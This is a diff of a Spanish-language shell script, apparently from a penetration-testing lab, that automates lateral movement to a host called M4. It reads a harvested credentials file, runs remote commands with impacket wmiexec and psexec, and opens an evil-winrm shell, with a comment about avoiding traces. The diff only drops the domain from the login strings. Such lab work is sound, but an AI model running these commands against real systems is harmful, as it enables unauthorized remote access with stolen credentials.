@@ -114,8 +114,8 @@ cat <<EOF
   cat $EXPORT/credenciales.txt
 
   # b) ejecución remota con impacket (usar la clave del archivo)
-  impacket-wmiexec.py '$M4_DOMAIN/$M4_USER:$M4_PASS@$M4' 'whoami'
-  impacket-psexec.py  '$M4_DOMAIN/$M4_USER:$M4_PASS@$M4' 'whoami'
+  impacket-wmiexec.py '$M4_USER:$M4_PASS@$M4' 'whoami'
+  impacket-psexec.py  '$M4_USER:$M4_PASS@$M4' 'whoami'
 
   # c) WinRM interactivo
   evil-winrm -i $M4 -u '$M4_USER' -p '$M4_PASS'
@@ -149,10 +149,10 @@ fi
 
 step "b) ejecución remota en M4 (impacket)"
 if command -v impacket-wmiexec.py >/dev/null 2>&1; then
-  impacket-wmiexec.py "$M4_DOMAIN/$M4_USER:$M4_PASS@$M4" 'whoami' \
+  impacket-wmiexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
     || warn "wmiexec falló (¿445/135 abiertos? ¿credenciales vigentes?)"
 elif command -v wmiexec.py >/dev/null 2>&1; then
-  wmiexec.py "$M4_DOMAIN/$M4_USER:$M4_PASS@$M4" 'whoami' \
+  wmiexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
     || warn "wmiexec falló"
 else
   warn "sin impacket en M6: sudo apt-get install -y python3-impacket"
@@ -160,7 +160,7 @@ fi
 
 if command -v impacket-psexec.py >/dev/null 2>&1; then
   step "b2) psexec (crea servicio; deja rastro, usar sólo si wmiexec falla)"
-  impacket-psexec.py "$M4_DOMAIN/$M4_USER:$M4_PASS@$M4" 'whoami' \
+  impacket-psexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
     || warn "psexec falló (normal si el servicio no puede crearse)"
 else
   warn "sin impacket-psexec.py (opcional)"
